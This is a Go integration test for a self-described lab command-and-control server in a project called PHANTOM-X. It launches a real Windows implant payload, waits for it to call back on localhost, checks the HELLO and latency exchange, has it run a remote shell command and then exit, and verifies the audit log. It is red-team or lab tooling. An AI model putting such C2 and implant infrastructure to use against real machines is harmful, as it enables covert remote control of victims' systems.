// =============================================================================
// PHANTOM-X :: Phase 5 -- Go C2 server integration test
// =============================================================================
// c2_server_test.go -- Exercises the Go lab C2 server against the REAL
// Windows payload (px_payload.exe), not a mock.
//
// The point is to prove the Go implementation speaks exactly the same wire
// protocol as the Python reference implementation. A mock client would only
// prove that the mock and the server agree with each other.
//
// On Windows the payload is launched directly. The payload picks its C2
// endpoint from the PX_C2_HOST / PX_C2_PORT environment variables.
//
// RUN
//     go test -v -run TestGoC2Integration .
//     go test -v -run TestGoC2Integration -payload <path\to\px_payload.exe> .
//
//     # or point at the prebuilt lab copy:
//     go test -v -run TestGoC2Integration \
//         -payload ..\dist\phantom-x-vm-lab\px_payload.exe .
// =============================================================================

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// flagPayload lets the operator point the test at a specific payload binary.
var flagPayload = flag.String("payload", "", "path to px_payload.exe")

// findPayload locates px_payload.exe if -payload was not supplied.
func findPayload(t *testing.T) string {
	t.Helper()

	if p := *flagPayload; p != "" {
		abs, err := filepath.Abs(p)
		if err != nil {
			t.Fatalf("cannot resolve payload path %q: %v", p, err)
		}
		if _, err := os.Stat(abs); err != nil {
			t.Fatalf("payload not found: %s", abs)
		}
		return abs
	}

	candidates := []string{
		filepath.Join("..", "dist", "phantom-x-vm-lab", "px_payload.exe"),
		filepath.Join("..", "phase3_fileless", "loader", "px_payload.exe"),
	}
	for _, c := range candidates {
		abs, _ := filepath.Abs(c)
		if _, err := os.Stat(abs); err == nil {
			return abs
		}
	}
	t.Skipf("no px_payload.exe found; build it or pass -payload <path>")
	return ""
}

// TestGoC2Integration drives a full session against the real payload.
func TestGoC2Integration(t *testing.T) {
	payload := findPayload(t)

	port := 9311
	auditPath := filepath.Join(t.TempDir(), "go_c2_itest.jsonl")

	srv := newServer("127.0.0.1", port, auditPath, false, 0)

	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind test port %d: %v", port, err)
	}
	defer ln.Close()

	go func() { srv.acceptLoop(ln) }()
	defer srv.shutdown()

	// Give the listener a moment to be fully wired up.
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	// -- wait for the session ------------------------------------------------
	sess := waitForSession(srv, 30*time.Second)
	if sess == nil {
		t.Fatal("payload never established a session")
	}
	t.Logf("session %d connected from %s", sess.id, sess.addr)

	// -- HELLO ---------------------------------------------------------------
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if sess.host != "?" && sess.host != "" {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if sess.host == "?" || sess.host == "" {
		t.Fatalf("HELLO was not parsed: arch=%q pid=%q host=%q",
			sess.arch, sess.pid, sess.host)
	}
	t.Logf("HELLO parsed: host=%s arch=%s pid=%s", sess.host, sess.arch, sess.pid)

	// -- latency -------------------------------------------------------------
	lat, ok := srv.measureLatency(sess, 15*time.Second)
	if !ok {
		t.Fatal("no PONG received")
	}
	t.Logf("latency measured: %.2f ms", lat)

	// -- EXEC ----------------------------------------------------------------
	res := srv.exec(sess, "cmd /c echo PHANTOM_X_GO_SERVER_PROOF", 30*time.Second)
	if res == nil {
		t.Fatal("EXEC timed out")
	}
	if !strings.Contains(res.Output, "PHANTOM_X_GO_SERVER_PROOF") {
		t.Fatalf("EXEC output did not contain the proof token: %q", res.Output)
	}
	t.Logf("EXEC returned exit=%s output=%q", res.ExitCode, strings.TrimSpace(res.Output))

	// -- counters ------------------------------------------------------------
	if sess.commandsCompleted < 1 {
		t.Fatalf("command counter did not increment: %d", sess.commandsCompleted)
	}

	// -- clean termination ---------------------------------------------------
	srv.audit.write("test_kill", map[string]any{"session": sess.id})
	sess.send("EXIT")
	termDeadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(termDeadline) {
		if !sess.alive {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if sess.alive {
		t.Fatal("payload did not acknowledge EXIT")
	}
	t.Log("payload acknowledged EXIT")

	// -- audit log -----------------------------------------------------------
	data, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("audit log missing: %v", err)
	}
	kinds := map[string]int{}
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if line == "" {
			continue
		}
		var rec map[string]any
		if err := json.Unmarshal([]byte(line), &rec); err != nil {
			t.Fatalf("audit line is not valid JSON: %v\n  %s", err, line)
		}
		if k, ok := rec["kind"].(string); ok {
			kinds[k]++
		}
	}
	for _, want := range []string{"server_start", "session_open", "hello", "pong", "result", "exec"} {
		if kinds[want] == 0 {
			t.Errorf("audit log is missing a %q record (have: %v)", want, kinds)
		}
	}
	t.Logf("audit records: %v", kinds)
}
